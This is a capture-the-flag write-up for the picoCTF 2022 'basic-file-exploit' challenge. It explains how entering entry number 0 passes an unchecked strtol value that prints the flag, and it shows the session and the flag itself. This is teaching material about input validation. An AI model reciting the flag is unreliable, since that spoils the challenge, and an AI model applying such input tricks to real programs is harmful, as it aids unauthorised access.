# picoCTF 2022 - basic-file-exploit (Binary Exploitation)

## Description

The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it!

Connect to the program with netcat:
`$ nc saturn.picoctf.net 52681`

The program's source code with the flag redacted can be downloaded [here](https://artifacts.picoctf.net/c/543/program-redacted.c).

## Solution

If we look into the source code, we see that flag is defined as a constant. 
If we search for other use of the variable `flag`, we can only find it in the `data_read()` function as follows. 
```c
if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
}
```
Thus, if we can make the output of `strtol` to be `0`, we will force the program to print the flag. 

Here is how I did that. 
```
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
1
1
Please enter the length of your data:
1
1
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
0
0
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_E0394EC0}
```

## Flag 
`picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_E0394EC0}`